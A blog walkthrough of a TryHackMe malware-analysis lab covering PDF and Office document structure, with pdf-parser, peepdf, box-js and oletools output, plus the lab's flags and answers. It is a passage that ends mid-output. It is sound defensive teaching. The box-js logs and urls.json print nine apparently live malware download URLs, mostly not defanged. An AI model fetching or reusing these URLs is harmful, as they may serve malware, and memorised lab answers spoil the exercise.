---
layout: post
title: 'THM MalDoc: Static Analysis'
tags: [THM, Malware Analysis, RE, Static Analysis]
author: NonoHM
date: 2024-10-13 16:05:51
toc:
    sidebar: left
    toc-depth: 3
---

## Task 1 - Introduction

Nowadays, documents are among the most common ways to share information. They are used for various purposes like reports, proposals and contracts. Because of their prevalence, they are also a common vector of attacks and malicious actors use documents to deliver malware, steal sensitive information or carry out phishing attacks.

Therefore, analyzing malicious documents is an essential part of any cyber security strategy. It can help identify potential threats by analyzing the document's content and taking steps to mitigate them. This is particularly important today when more businesses rely on digital documents to share and store sensitive information.

### Expected Outcome

The expected outcome of this room is to determine if a document is malicious or not by looking at the following indicators:

- Presence of malicious URLs / Domains
- References to File Names / API Functions
- IP Addresses
- Malicious scripts like Powershell, JavaScript, VBScript...

In this room, we will understand the different variants of malicious documents, their structure and how they are used in different phishing attacks. We will then explore the tools and concepts required to analyze a document.

### Learning Objectives

In this room, we will cover:

- Different documents like OneNote, docm, docx, xls...
- Analyze complex Javascript
- Importance of Malicious Document Analysis
- PDF Structure and key components like objects, keywords and filtering

## Task 3 - Initial Access - Spearphishing Attachment

Malicious documents are one of the primary ways to get initial access to a system or a network. Many [APT](https://www.crowdstrike.com/en-us/cybersecurity-101/threat-intelligence/advanced-persistent-threat-apt/) (Advanced Persistent Threat) groups have found utilizing spearphishing attachments as their *Initial Access Technique*.

### Spearphishing Attachment

[Spearphishing attachments](https://attack.mitre.org/techniques/T1566/001/) are very common cyberattacks targeting specific individuals or organizations through carefully crafted and personalized phishing emails. The attacker aims to trick the recipient into opening a malicious attachment, typically containing an harmful payload. By doing so, he gains unauthorized access to the target's system, allowing the stealing of sensitive information and more.

Advanced Persistent Threats (APT) are highly organized cybercrime groups or state-sponsored entities known to use spearphishing attacks to infiltrate their targets' systems. Here are a few examples of APT groups that have used spearphishing attachments in their attacks:

- **APT28 (Fancy Bear):** This Russian state-sponsored group has been responsible for various high-profile cyberattacks, such as the 2016 Democratic National Committee (DNC) hack. APT28 used spearphishing emails with malicious attachments disguised as legitimate files to trick recipients into opening them. Once opened, the malware installed on the victims' computers allowed the attackers to exfiltrate sensitive information.
- **APT34 (OilRig):** APT34 is an Iranian cyber espionage group that has targeted various industries, primarily focusing on the Middle East. One of their tactics includes spearphishing emails with malicious Microsoft Excel attachments. When victims open the attachment, a macro initiates the download and installation of malware, which then establishes a connection with the attackers' command and control servers.
- **APT29 (Cozy Bear):** Another Russian state-sponsored group, APT29, has targeted governments and organizations worldwide. In a high-profile attack against the Norwegian Parliament in 2020, APT29 sent spearphishing emails with malicious attachments to parliament members. The attack resulted in unauthorized access to sensitive data.
- **APT10 (MenuPass Group):** A Chinese cyber espionage group, APT10 has targeted organizations in various sectors, including government, aerospace, and healthcare. They have used spearphishing emails with malicious attachments that appear to be legitimate documents, such as job offers or invoices. When the attachment is opened, the malware contained within it compromises the target's system, allowing APT10 to exfiltrate sensitive data.

### Associated Malware Families

Some of the malware families that are spreading through malicious documents are:

- **Emotet:** Banking trojan that is often distributed through malicious email attachments, typically in the form of Microsoft Word documents. Once installed, Emotet can steal sensitive information, such as banking credentials and email addresses, and it can also be used to download additional malware. MITRE reference available [here]( https://attack.mitre.org/software/S0367/.).
- **Trickbot:** Banking trojan that is often distributed through malicious email attachments and is known for its modular design, which allows attackers to add new functionality to the malware as needed. Trickbot has been used to deliver ransomware, exfiltrate data, and perform other types of malicious activity. MITRE reference available [here](https://attack.mitre.org/software/S0383/).
- **QBot:** Banking trojan that is often distributed through malicious email attachments and is known for its ability to steal banking credentials and other sensitive information. QBot is also capable of downloading and executing additional malware and can be used to create backdoors on infected systems. MITRE reference available [here](https://attack.mitre.org/software/S0385/).
- **Dridex:** Banking trojan that is often distributed through malicious email attachments and is known for its ability to steal banking credentials and other sensitive information. Dridex has been active since 2014 and has been one of the most prevalent banking trojans in recent years. MITRE reference available [here](https://attack.mitre.org/software/S0384/).
- **Locky:** Ransomware family that is often spread through malicious email attachments, typically in the form of Microsoft Word documents. Once installed, Locky encrypts the victim's files and demands a ransom payment in exchange for the decryption key. MITRE reference available [here](https://attack.mitre.org/software/S0369/).
- **Zeus:** Banking trojan that has been active since 2007 and is often distributed through malicious email attachments. Zeus is known for its ability to steal banking credentials and other sensitive information and has been used in numerous high-profile attacks over the years. MITRE reference available [here](https://attack.mitre.org/software/S0382/).
- **Petya:** Ransomware family that is often spread through malicious email attachments and has been active since 2016. Petya is known for its ability to encrypt the victim's entire hard drive, making it much more difficult to recover from than other types of ransomware. MITRE reference available [here](https://attack.mitre.org/software/S0367/).

### Questions

**From which family does the Locky malware belong to?**

*Answer: `Ransomware`*

**What is the Sub-technique ID assigned to Spearphishing Attachment?**

*Answer: `T1566.001`*

## Task 4 - Documents and their malicious use

Attackers can abuse different type of digital documents and readers security flaws to execute code on a user's system. That is why it is important to be cautious when opening documents from unknown sources and to keep software / security measures up to date to reduce the risk of falling victim of these attacks.

### PDF

Portable Document Format (PDF) is a widely used document format that can be opened on different devices. PDF files can be exploited by attackers to deliver malware or launch attacks through techniques like embedding malicious JavaScript, exploiting vulnerabilities in PDF readers, including phishing links, hiding malicious attachments, or using social engineering tactics. These methods can lead to malware downloads, system compromise, or credential theft. To stay safe, users should keep PDF software updated, disable JavaScript, avoid opening suspicious PDFs, and use security tools to scan files.

### DOCM

Microsoft Word documents can be used to deliver malware by using macros, which are a series of commands that automate tasks within a document. Unlike *.docm* files, *.docx* should not contain any macros and are deleted when the file is being saved. With recent versions of Word, the *.docm* file renamed *.docx* will not open and will appear corrupted because word treat differently the file by considering their extension.
In completion, *.doc* files for Word 97-2003 are not structured like *.docx* and variants, hence they can embed macros and don't give as much protection as *.docx* files.
Attackers create malicious DOCM files that prompt users to enable macros to view the content, which, once activated, can execute harmful code to steal data or install malware. To mitigate this risk, users should avoid enabling macros from untrusted documents and scan files for threats.

### XLSM/PPTM...

Excel spreadsheets and Powerpoint can be used as the same way as Word documents using macros.

### XML

Extensible Markup Language (XML) is a markup language used to store and transport data. Attackers can use XML documents to exploit vulnerabilities in a user's system. For example, attackers can inject malicious code into an application by uploading an XML file that contains code designed to exploit vulnerabilities in the application software.

### OneNote

OneNote is a digital note-taking application that allows users to organize and share their notes across devices. While OneNote itself is not typically used to deliver malicious content, it can be abused to deliver phishing attacks by containing rogue links or via embeded objects. Unlike Word, Excel and Powerpoint, it is not directly possible to use VBA macros with *.one* files.

## Task 5 - PDF Documents - Structure

Before starting analyzing PDF Documents, we must understand its structure and what are the components that can be found within one.

A PDF file consists of a series of objects that are organized into a specific structure. The following is a brief overview of a PDF file structure:

- **PDF Header:** The header is the first line in a PDF file, containing a file signature and a version number. The *file signature* is a sequence of characters that identifies the file as PDF, which is `%PDF-x.x`. The version number indicates the version of the PDF specification used to create the document.

``` pdf
%PDF-1.7 // Example of a PDF Header
```

- **PDF Body:** The body contains a series of objects that are organized in a specific structure. Each object is identified by an object number and generation number, which are used to uniquely identify the object within the document.

``` pdf
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
>>
endobj
2 0 obj
<< /Type /Pages
   /Kids [3 0 R 4 0 R]
   /Count 2
>>
endobj
3 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 5 0 R
>>
endobj
4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 612 792]
   /Contents 6 0 R
>>
endobj
```

Below is a detailed summary of different object types available in PDF standards:

| **Object Type**    | **Description**                                          | **Example**                                                                                                                                                   | **Explanation**                                                                                     |
|---------------------|----------------------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------|
| **Text Object**     | Represents text content with formatting and positioning. | ```plaintext BT /F1 12 Tf 100 700 Td (Hello, World!) Tj ET ```                                                                                               | - `BT`: Begin text block. <br> - `/F1 12 Tf`: Set font to `/F1` with size `12`. <br> - `Td`: Move to (100, 700). <br> - `Tj`: Show text "Hello, World!". <br> - `ET`: End text block. |
| **Image Object**    | Holds images with their attributes.                     | ```plaintext << /Type /XObject /Subtype /Image /Width 300 /Height 200 /ColorSpace /DeviceRGB /BitsPerComponent 8 /Filter /DCTDecode /Length 12345 >> stream <binary image data here> endstream ``` | - `/Type /XObject`: Indicates it's an external object. <br> - `/Subtype /Image`: Specifies it's an image. <br> - `/Width` & `/Height`: Set dimensions. <br> - `/Filter /DCTDecode`: JPEG compression. |
| **Graphic Object**  | Defines shapes, lines, and colors.                      | ```plaintext 0.5 0.5 0.5 RG 100 600 200 100 re f ```                                                                                                        | - `0.5 0.5 0.5 RG`: Set fill color to grey (RGB). <br> - `re`: Create a rectangle at (100, 600) with width 200 and height 100. <br> - `f`: Fill the rectangle. |
| **Form Object**     | Allows for interactive elements like text fields.       | ```plaintext << /Type /Annot /Subtype /Widget /Rect [100 500 200 550] /FT /Tx /T (TextField1) /V (Default Text) /F 4 /MK << /BC [0 0 1] /BG [1 1 1] >> >> ```   | - `/Type /Annot`: Annotation object. <br> - `/Subtype /Widget`: Indicates an interactive element. <br> - `/Rect`: Define the field's rectangle area. <br> - `/FT /Tx`: Text field type. |
| **Content Stream**   | Sequence of instructions for rendering the page.       | ```plaintext 1 0 0 1 0 0 cm BT /F1 24 Tf 100 700 Td (Welcome to the PDF!) Tj ET 0 0 0 RG 50 50 200 100 re f ```                                               | - `1 0 0 1 0 0 cm`: Transformation matrix. <br> - `BT` & `ET`: Begin and end text block. <br> - `Td`: Move to position. <br> - `RG`: Set fill color to black. <br> - `re` and `f`: Create and fill a rectangle. |
| **Font Object**     | Defines font properties used for text.                  | ```plaintext << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> ```                                                                                      | - `/Type /Font`: Object type is a font. <br> - `/Subtype /Type1`: Specifies the font type. <br> - `/BaseFont /Helvetica`: Name of the font. |

- **PDF Cross-Reference Table:** The cross-reference table is a table that provides a map of the locations of all the objects in the PDF file. It is made to quickly locate objects within the file and it is used by reader software. It allows the PDF reader to jump to the object without needing to scan the whole document, which makes viewing large PDF faster.
This is not to be mistaken for *Outlines/Bookmarks*, which are made for user to navigate fluently through the PDF.

The table consists of a **starting header** `xref` and the numbers `x y`, which *x* is the **first object number** in the PDF (usually *0*) and *y* is the **amount of objects** present in the file. Then, the table of objects starts and each row is composed of a 10-digit number `XXXXXXXXXX`, which is the **object offset compared to the beginning of the file**. Moreover, there is a 5-digit number `YYYYY`, which increments as the object is modified through an editor. Also, there is a character `f` for free object, which is unused in the file and char `n` for an in-use object. These two types exists in order to not change every reference every time an object has been modified.
We must note that the first object in a pdf, `object 0` is always a free object with the reserved generation number `65535`, serving as a placeholder.

| **Section**             | **Description**                                                                                          | **Example**                      |
|-------------------------|----------------------------------------------------------------------------------------------------------|----------------------------------|
| **Starting Header**      | The keyword that starts the xref table.                                                                  | `xref`                           |
| **x y (Subsection Info)**| Indicates the first object number (**x**) and the number of objects (**y**) in the subsection.            | `0 5` (Starts at object 0, 5 objects total) |
| **XXXXXXXXXX (Offset)**  | A 10-digit number representing the **byte offset** of the object from the beginning of the file.         | `0000000150` (Object at byte 150) |
| **YYYYY (Generation)**   | A 5-digit number representing the **generation number** of the object.                                   | `00000` (Original generation)    |
| **n (Normal Object)**    | Indicates the object is **in use** in the PDF file.                                                      | `0000000150 00000 n`             |
| **f (Free Object)**      | Indicates the object is **free**, meaning it is deleted or unused but kept for reuse.                    | `0000000000 65535 f`             |
| **Object 0**             | The first object in a PDF file, always a **free object** with generation number `65535`.                 | `0000000000 65535 f`             |

``` pdf
xref
0 5
0000000000 65535 f    % Object 0: Always free
0000000010 00000 n    % Object 1: In use, at byte 10
0000000150 00000 n    % Object 2: In use, at byte 150
0000000200 00001 f    % Object 3: Free, generation 1, which was in-use before and now has been deleted
0000000300 00000 n    % Object 4: In use, at byte 300
```

- **PDF Trailer:** The trailer is the last section in a PDF file and provides information about the document, such as the cross-reference table location, file metadata and any encryption or security settings.

| **Section**             | **Description**                                                                                          | **Example**                   |
|-------------------------|----------------------------------------------------------------------------------------------------------|-------------------------------|
| **Starting Keyword**      | The keyword that begins the trailer section.                                                             | `trailer`                     |
| **Trailer Dictionary**    | A dictionary containing key-value pairs that provide essential information about the PDF file.            | `<< ... >>`                   |
| **`/Size`**              | Indicates the total number of objects in the cross-reference table.                                       | `/Size 6`                     |
| **`/Root`**              | Reference to the **root object** (catalog) of the PDF, defining the document's structure.                | `/Root 1 0 R`                 |
| **`/Info`**              | Reference to the **document information dictionary** containing metadata (like title, author, etc.).     | `/Info 2 0 R`                 |
| **`/ID`**                | The **file identifier**, which is a unique ID for the PDF file, consisting of two parts (original and modified IDs). | `/ID [<e382f6...> <e382f6...>]` |
| **`/Prev`** (Optional)   | Points to the byte offset of the **previous cross-reference table** for incremental updates.               | `/Prev 1234`                  |
| **`startxref`**          | Indicates the **byte offset** where the cross-reference table begins in the PDF file.                     | `startxref 456`               |
| **`%%EOF`**              | Marks the **end of the file**.                                                                            | `%%EOF`                       |  
  
``` pdf
trailer
<<
  /Size 6
  /Root 1 0 R
  /Info 2 0 R
  /ID [<e382f6...> <e382f6...>]
  /Prev 1234
>>
startxref
456
%%EOF
```

Now we have explored the different sections of the PDF file format, we will see some important keywords with a focused usage in maldocs:

| PDF Keyword             | Actions                                                                                                                                                                              |
|-------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| /JavaScript             | Specifies that JavaScript code will be executed.                                                                                                                                     |
| /JS                     | Contains the actual JavaScript code to be executed, for example, `(app.alert("Hello, World!"))`, which displays an alert box with the message "Hello, World!".                       |
| /Names                  | Lists file names or other references used within the PDF document.                                                                                                                   |
| /OpenAction             | Defines an action that will automatically execute when the PDF is opened. Located in the document catalog (the root of the PDF), it can run JavaScript, navigate to a page, etc.    |
| /AA (Additional Action) | Specifies additional actions linked to document events or interactive elements, such as running a script when a user performs a specific action.                                     |
| /EmbeddedFile           | Refers to files embedded within the PDF, like scripts or other attachments, which can be accessed or executed.                                                                       |
| /URI                    | Contains links to external URLs, allowing the PDF to link to websites or online resources.                                                                                           |
| /SubmitForm             | Defines an action to submit form data within the PDF, typically to a specified URL or email address.                                                                                |
| /Launch                 | Runs embedded scripts or launches other files within the PDF, sometimes referencing external files that the PDF may download or open.                                               |

For knowledge, a JavaScipt object is defined like below:

``` pdf
4 0 obj
<<
  /Type /Action
  /S /JavaScript
  /JS (app.alert("Hello, World!"))
>>
endobj
```

- **`4 0 obj`**: This is the identifier for the object. In this case, it is **object 4**, generation **0**.
- **`/Type /Action`**: This tells the PDF reader that the object is an **action**.
- **`/S /JavaScript`**: The **`/S`** key defines the **subtype of the action**, which in this case is **JavaScript** (`/S /JavaScript` means this action will execute JavaScript code).
- **`/JS (app.alert("Hello, World!"))`**: This is the actual **JavaScript code** to be executed. Here, it shows an alert dialog box that says **"Hello, World!"** when triggered.
- **`endobj`**: This marks the end of the object.

In order to trigger it, here `/OpenAction` flag is used. `/OpenAction` entry is located in the document catalog (the root object of the PDF). It defines an action that is automatically triggered when the document is opened, such as running JavaScript, navigating to a specific page, or zooming to a certain view.

``` pdf
1 0 obj
<<
  /Type /Catalog
  /Pages 2 0 R
  /OpenAction 4 0 R
>>
endobj
```

- **`/OpenAction 4 0 R`:** Indictates to trigger the object **4**, generation **0**. The **R** keyword indicates that an *indirect reference* to another object is being made.

### Analyzing a simple.pdf document

Within the provided lab, we have a PDF file called `simple.pdf`. By using *notepad*, it is able to recognize the PDF structure and components:

{% include figure.liquid path="/assets/img/images/thm_maldoc_static_analysis/By53snY1yg.png" title="notepad simple.pdf" class="img-fluid rounded z-depth-1" %}

### Question

**Who is the author of the simple.pdf document?**

The author's name is available in the 7th object.

*Answer: `Ben`*

## Task 6 - Analyzing a PDF Document

When opening `simple.pdf` using notepad, we can get at first sight:

- PDF Version
- Author name
- Objects
- Keywords like *JavaScript*, *Action*...
- Trailer

Similar information can be obtained using the `strings` command.

### Tools

#### pdfid.py

`pdfid.py` is a tool to summarize the objects/keywords found in a PDF. We will try it using `pdfid.py simple.pdf`:

``` sh
remnux@thm-remnux:~/Desktop$ pdfid.py simple.pdf 
PDFiD 0.2.5 simple.pdf
 PDF Header: %PDF-1.7
 obj                   18    //1
 endobj                18
 stream                 3    //2
 endstream              3
 xref                   1
 trailer                1
 startxref              1
 /Page                  1
 /Encrypt               0
 /ObjStm                0
 /JS                    1    //3
 /JavaScript            1
 /AA                    0
 /OpenAction            1    //4
 /AcroForm              0
 /JBIG2Decode           0
 /RichMedia             0
 /Launch                0
 /EmbeddedFile          0
 /XFA                   0
 /Colors > 2^24         0
```

1. **Objects:** This document contains 18 objects.
2. **Streams:** This document contains 3 streams (image, code, description...) that we might examine.
3. **JS / Javascript:** This document contains 1 Javascript and 1 JS instance.
4. **OpenAction:** Indicates an action will be performed when the document will be opened.

#### pdf-parser.py

`pdf-parser.py` is very handy tool used to parse, search for objects, filter and more...

Its usage is the following:

``` sh
pdf-parser.py [option] file|zip|url
```

We can get the `/OpenAction` keyword by using the `--search` option.

``` pdf
remnux@thm-remnux:~/Desktop$ pdf-parser.py --search OpenAction simple.pdf 
obj 1 0
 Type: /Catalog
 Referencing: 2 0 R, 3 0 R, 4 0 R, 5 0 R, 6 0 R

  <<
    /Type /Catalog
    /Pages 2 0 R
    /Lang (en-GB)
    /StructTreeRoot 3 0 R
    /MarkInfo
      <<
        /Marked true
      >>
    /Metadata 4 0 R
    /ViewerPreferences 5 0 R
    /OpenAction 6 0 R
  >>
```

The output shows that *OpenAction* will trigger the object number **6**, which is the *JavaScript* object.

``` pdf
remnux@thm-remnux:~/Desktop$ pdf-parser.py --object 6  simple.pdf 
obj 6 0
 Type: /Action
 Referencing: 

  <<
    /Type /Action
    /S /JavaScript
    /JS <6170702E616C657274282254484D7B4C75636B696C795F546869735F49736E27745F4861726D66756C7D22293B0A>
  >>
```

Using the above outputs, we can deduce that the `<617070...` hexadecimal-text cipher will be executed as JS code as the pdf is opened.

#### peepdf

`peepdf` is another PDF analysis tool to determine if there is any suspicious elements. We can also use the interactive option `peepdf -i pdf_file` to navigate through the objects.

With `peepdf simple.pdf`, we already get useful information such as:

- Hashes.
- Number of objects/streams/URLS found in the document.
- References to the objects.
- List of suspicious elements like *JavaScript/OpenAction*, etc.

``` sh
remnux@thm-remnux:~/Desktop$ peepdf simple.pdf 
Warning: PyV8 is not installed!!

File: simple.pdf
MD5: 2992490eb3c13d8006e8e17315a9190e
SHA1: 75884015d6d984a4fcde046159f4c8f9857500ee
SHA256: 83fefd2512591b8d06cda47d56650f9cbb75f2e8dbe0ab4186bf4c0483ef468a
Size: 28891 bytes
Version: 1.7
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 18
Streams: 3
URIs: 0
Comments: 0
Errors: 0

Version 0:
 Catalog: 1
 Info: 7
 Objects (18): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18]
 Streams (3): [4, 15, 18]
  Encoded (2): [15, 18]
 Objects with JS code (1): [6]
 Suspicious elements:
  /OpenAction (1): [1]
  /JS (1): [6]
  /JavaScript (1): [6]
```

After that, we might use the interactive function for deeper analysis:

``` sh
PPDF> help

Documented commands (type help <topic>):
========================================
bytes           exit         js_jjdecode       open          search    
changelog       extract      js_join           quit          set       
create          filters      js_unescape       rawobject     show      
decode          hash         js_vars           rawstream     stream    
decrypt         help         log               references    tree      
embed           info         malformed_output  replace       vtcheck   
encode          js_analyse   metadata          reset         xor       
encode_strings  js_beautify  modify            save          xor_search
encrypt         js_code      object            save_version
errors          js_eval      offsets           sctest 
```

Furthermore, using *object*, we are able to retrieve our previously found JS object. The JS code is even decoded.

``` pdf
PPDF> object 6

<< /Type /Action
/S /JavaScript
/JS app.alert("THM{Luckily_This_Isn't_Harmful}");
 >>
```

Similarly, we can extract the actual JS code with the *extract* keyword:

``` pdf
PPDF> extract

Usage: extract uri|js [$version]

Extracts all the given type elements of the specified version after being decoded and decrypted (if necessary)

PPDF> extract js

// peepdf comment: Javascript code located in object 6 (version 0)

app.alert("THM{Luckily_This_Isn't_Harmful}");
```

Now, we are able to extract *IOC* (Indicators of Compromise) from a PDF file. A more complex JS code with IOC will be unraveled.

### Questions

**What is the flag found inside the JavaScript code?**

*Answer: `THM{Luckily_This_Isn't_Harmful}`*

**How many OpenAction objects were found within the document?**

*Answer: `1`*

**How many Encoded objects were found in the document?**

*Answer: `2`*

**What are the numbers of encoded objects? (Separate with a comma)**

*Answer: `15,18`*

## Task 7 - Analyzing Malicious JavaScript

To start with, we are provided an obfuscated javascript code by a junior analyst and our role is to skim through the code to examine its characteristics and possibly deobfuscate. This is made in order to extract IOCs that could help in creating detection rules.

In the provided lab, we open the file `notepad  /home/remnux/Javascript-code/embedded-code.js`.

{% include figure.liquid path="/assets/img/images/thm_maldoc_static_analysis/S12xAECkyg.png" title="notepad embedded-code.js" class="img-fluid rounded z-depth-1" %}

The code has the following characteristics:

- It is very complex and time-consuming to analyze
- It is heavily obfuscated with nonsense variable names

It is posible to do a static analysis by trying to deobfuscate the code. However, we will choose the option of dynamic analysis using `box-js` to save some time while being able to extract IOCs.

*Box-js* is a tool made to run a javascript code in a controlled environment . It is primarily made for analyzing malicious code with automatic dynamic analysis in a sandbox.

When we open our obfuscated code in the sandbox tool, we get the detected IOCs in the console, which here are some weird-looking URLs:

``` sh
remnux@thm-remnux:~/Javascript-code$ box-js embedded-code.js 
Using a 10 seconds timeout, pass --timeout to specify another timeout in seconds
[warn] jschardet (v1.6.0) couldn't detect encoding, using UTF-8
[info] GET https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/
[info] IOC: The script fetched an URL.
[info] GET http://aristonbentre.com/slideshow/O1uPzXd2YscA/
[info] IOC: The script fetched an URL.
[info] GET https://applink.gr/wp-admin/pWxO42PQrVL0ja5LTfhy/
[info] IOC: The script fetched an URL.
[info] GET http://attatory.com/i-bmail/6AfEa8G0W8NOtUh7hqFj/
[info] IOC: The script fetched an URL.
[info] GET http://asakitreks.com/uploads/ce8u7/
[info] IOC: The script fetched an URL.
[info] GET https://www.ata-sistemi.si/wp-admin/cVDQapxmtAQQq1gr3/
[info] IOC: The script fetched an URL.
[info] GET http://bvdkhuyentanyen.vn/files/TKK8yKdEvyYAbBE5avb/
[info] IOC: The script fetched an URL.
[info] GET http://bluegdps100.7m.pl/app/Ac8wwulKxqZjc/
[info] IOC: The script fetched an URL.
[info] GET https://casapollux.com/Bilder/GDo3zoURY/ 
[info] IOC: The script fetched an URL.
```

As a result, we get the dropped files and useful information retrieved by *box-js*:

``` sh
remnux@thm-remnux:~/Javascript-code$ ls
embedded-code.js  embedded-code.js.results
remnux@thm-remnux:~/Javascript-code$ ls -lha embedded-code.js.results/
total 152K
drwxrwxr-x 2 remnux remnux 4.0K Oct 17 07:44 .
drwxrwxr-x 3 remnux remnux 4.0K Oct 17 07:44 ..
-rw-rw-r-- 1 remnux remnux  941 Oct 17 07:44 analysis.log
-rw-rw-r-- 1 remnux remnux 126K Oct 17 07:44 c5c3e5e4-5276-40ca-a61f-d7779b7d3220.js
-rw-rw-r-- 1 remnux remnux 1.7K Oct 17 07:44 IOC.json
-rw-rw-r-- 1 remnux remnux   72 Oct 17 07:44 snippets.json
-rw-rw-r-- 1 remnux remnux  465 Oct 17 07:44 urls.json
```

*IOC.json*

``` json
[
 {
  "type": "UrlFetch",
  "value": {
   "method": "GET",
   "url": "https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/",
   "headers": {}
  },
  "description": "The script fetched an URL."
 },
...
]
```

*urls.json*

``` json
[
 "https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/",
 "http://aristonbentre.com/slideshow/O1uPzXd2YscA/",
 "https://applink.gr/wp-admin/pWxO42PQrVL0ja5LTfhy/",
 "http://attatory.com/i-bmail/6AfEa8G0W8NOtUh7hqFj/",
 "http://asakitreks.com/uploads/ce8u7/",
 "https://www.ata-sistemi.si/wp-admin/cVDQapxmtAQQq1gr3/",
 "http://bvdkhuyentanyen.vn/files/TKK8yKdEvyYAbBE5avb/",
 "http://bluegdps100.7m.pl/app/Ac8wwulKxqZjc/",
 "https://casapollux.com/Bilder/GDo3zoURY/ "
]
```

*analysis.log*

``` log
[warn] jschardet (v1.6.0) couldn't detect encoding, using UTF-8
[info] GET https://oopt.center:443/bitrix/HKD1OCEK4mWEc0/
[info] IOC: The script fetched an URL.
[info] GET http://aristonbentre.com/slideshow/O1uPzXd2YscA/
[info] IOC: The script fetched an URL.
...
```

*snippets.json*

``` json
{
 "241448cc-e5cf-419e-9056-a8af926e924e.js": {
  "as": "eval'd JS"
 }
a
```

### Question

**What is the name of the dumped file that contains information about the URLs?**

*Answer: `urls.json`*

**How many URLs were extracted from JavaScript?**

We can count manually or use `grep` and `wc` to count lines for us:

``` sh
remnux@thm-remnux:~/Javascript-code/embedded-code.js.results$ cat urls.json | grep -oP '"https?://[^"]+"' | wc -l
9
```

*Answer: `9`*

**What is the full URL which contains the keyword slideshow? (defang the URL)**

We can manually check or also use `grep` to take the URL:

``` sh
remnux@thm-remnux:~/Javascript-code/embedded-code.js.results$ cat urls.json | grep -oP 'https?://[^"]*slideshow[^"]*' 
http://aristonbentre.com/slideshow/O1uPzXd2YscA/
```

Then, we **defang** (making the url safe to share) the URL using *Cyberchef*:

{% include figure.liquid path="/assets/img/images/thm_maldoc_static_analysis/rJBKiBAJkl.png" title="Cyberchef defang" class="img-fluid rounded z-depth-1" %}

*Answer: `hxxp[://]aristonbentre[.]com/slideshow/O1uPzXd2YscA/`*

## Task 8 - Office Docs Analysis

Word documents are files created using Microsoft Word, a popular word-processing application. These files typically have a *.doc* or *.docx* file extension and can contain text, images, tables, charts...
There are two Word document formats:

- **Structured Storage Format (OLE - Object Linking and Embedding):** This type of document is a binary format used by Word 97-2003? These  files have extensions like *.doc*, *.ppt*...
- **Office Open XML Format (OOXML):** This document type is an XML-formated document used by Word 2007 and later. It is actually a zipped file containing all related data within the document. These files have extensions such as *.docx*, *.docm*, *.pptx*...

### What makes a document malicious

As learned, a document can embed various elements, which some can be used for malicious intent.

- **Macros:** Macros are small VBA scripts embedded in Word documents. They are used to automate tasks bu they can also be used to execut malicious code. It can download and install malware on a user's system, steal sensitive information and more.
- **Embedded objects:** Word documents can contain embedded objects such as images, audio, video or other types of file. Malicious documents can contain embedded objects that are designed to exploit vulnerabilities of the software.
- **Links:** Some links can redirect to websites that host malware or phishing pages.
- **Exploits:** Some code can exploit vulnerabilites in the software. These exploits would typically download and isntall malware on the system.
- **Hidden Content:** Some hidden contents are not visible to the user but can be used to execute malicious code.

### Analyzing a malicious document

Within the provided lab, we got a sample called `suspicious.doc`.

The `trid` tool is used to identify a file type regardless of its file extension using the file's characteristics. We will verify our `suspicious.doc` to make sure it is really a *Microsoft Word 97-2003* document.

``` sh
remnux@thm-remnux:~/worddoc$ trid suspicious.doc 

TrID/32 - File Identifier v2.24 - (C) 2003-16 By M.Pontello
Definitions found:  13206
Analyzing...

Collecting data from file: suspicious.doc
 52.6% (.DOC) Microsoft Word document (30000/1/2)
 33.3% (.DOC) Microsoft Word document (old ver.) (19000/1/2)
 14.0% (.) Generic OLE2 / Multistream Compound (8000/1)
```

`oletools` is a collection of Python tools designed to analyze Microsoft Office documents, especially those using OLE (Object Linking and Embedding) format (Office 97-2003), for malicious content such as macros or embedded objects. It helps detect and extract potential malware, hidden code, or suspicious indicators within Word documents and other OLE-based files. Only `olevba` can be used on *.docx* and *.doc* to extract VBA macros.

`oleid` is used to extract information of a *.doc* to get a better understanding of its structure. We notice this document is a not encrypted document for *Microsoft Office Word* which contains VBA macros.

``` sh
remnux@thm-remnux:~/worddoc$ oleid suspicious.doc
oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: suspicious.doc
 Indicator                      Value                    
 OLE format                     True                     
 Has SummaryInformation stream  True                     
 Application name               b'Microsoft Office Word' 
 Encrypted                      False                    
 Word Document                  True                     
 VBA Macros                     True                     
 Excel Workbook                 False                    
 PowerPoint Presentation        False                    
 Visio Drawing                  False                    
 ObjectPool                     False                    
 Flash objects                  0   
```

`olemeta` is used to extract streams and metadata information about a document. Key information we get are :  

- Author's name
- When the document was saved

``` sh
remnux@thm-remnux:~/worddoc$ olemeta suspicious.doc 
olemeta 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: suspicious.doc

Properties from the SummaryInformation stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage             |1252                          |
|title                |                              |
|subject              |                              |
|author               |CMNatic                       |
|keywords             |                              |
|comments             |                              |
|template             |Normal.dotm                   |
|last_saved_by        |CMNatic                       |
|revision_number      |1                             |
|total_edit_time      |60                            |
|create_time          |2023-09-12 11:45:00           |
|last_saved_time      |2023-09-12 11:46:00           |
|num_pages            |1                             |
|num_words            |0                             |
|num_chars            |0                             |
|creating_application |Microsoft Office Word         |
|security             |0                             |
+---------------------+------------------------------+

Properties from the Document Summary Information stream:
+---------------------+------------------------------+
|Property             |Value                         |
+---------------------+------------------------------+
|codepage_doc         |1252                          |
|lines                |0                             |
|paragraphs           |0                             |
|scale_crop           |False                         |
|company              |                              |
|links_dirty          |False                         |
|chars_with_spaces    |0                             |
|shared_doc           |False                         |
|hlinks_changed       |False                         |
|version              |1048576                       |
+---------------------+------------------------------+
```

`oletimes` shows all the modification times of the different streams available.

``` sh
remnux@thm-remnux:~/worddoc$ oletimes suspicious.doc 
oletimes 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
